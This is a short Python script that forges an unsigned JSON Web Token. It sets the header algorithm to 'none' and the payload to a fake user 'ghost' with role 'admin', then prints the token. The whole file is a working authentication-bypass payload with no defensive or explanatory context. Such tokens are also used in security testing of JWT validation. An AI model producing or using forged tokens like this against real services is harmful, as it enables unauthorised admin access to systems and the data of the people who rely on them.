# quick unsigned token
import base64, json
def b64u(x): return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
hdr = {"alg":"none","typ":"JWT"}
pl  = {"user":"ghost","role":"admin"}
token = f"{b64u(json.dumps(hdr).encode())}.{b64u(json.dumps(pl).encode())}."
print(token)

